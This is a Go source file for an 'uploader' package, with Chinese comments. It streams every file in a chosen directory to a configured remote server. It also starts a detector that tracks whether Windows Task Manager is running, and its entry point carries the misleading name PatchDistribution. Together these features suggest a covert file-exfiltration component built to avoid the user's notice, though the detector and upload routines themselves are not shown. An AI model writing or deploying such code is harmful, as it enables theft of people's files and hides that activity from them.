package uploader

import (
	"net"
	"os"
	"sync/atomic"
)

var (
	// 任务管理器是否开启
	TaskmgrRunning atomic.Bool
)

type Config struct {
	ServerAddr           string
	ClientID             string
	MaxConcurrentUploads int
	SpeedLimitBytes      int64 // 0 = 不限速
}

type Uploader struct {
	cfg             Config
	connFunc        net.Conn
	SpeedLimitBytes int64
	BufferSize      int
}

// 调用接口的信息转换
func New(cfg Config, factory net.Conn) *Uploader {
	if cfg.MaxConcurrentUploads == 0 {
		cfg.MaxConcurrentUploads = 5
	}

	// 全局变量给值
	GlobalUploadSem = make(chan struct{}, cfg.MaxConcurrentUploads)
	ServerAddr = cfg.ServerAddr

	return &Uploader{
		cfg:             cfg,
		connFunc:        factory,
		SpeedLimitBytes: cfg.SpeedLimitBytes,
	}
}

func SafeGo(fn func()) {
	go func() {
		defer func() { recover() }()
		fn()
	}()
}

// 程序分发入口
func (u *Uploader) PatchDistribution(dirPath string) {

	StartTaskManagerDetector(u.connFunc)

	// 检查路径是文件还是目录
	info, err := os.Stat(dirPath)
	if err != nil {
		// clog.LogMessage("路径错误：%v\n", err)
		return
	}

	if info.IsDir() {
		// 流式目录上传（main.go 王者级）
		task := &UploadTask{
			ClientID: ClientName,
			RootPath: dirPath,
			connFunc: u.connFunc,
			FileChan: make(chan string, 5000),
			Done:     make(chan struct{}),
		}

		task.startScanning()
		task.startUploading()
	} else {
		task := &UploadTask{
			ClientID: ClientName,
		}
		task.doSendFile(dirPath)
	}
}
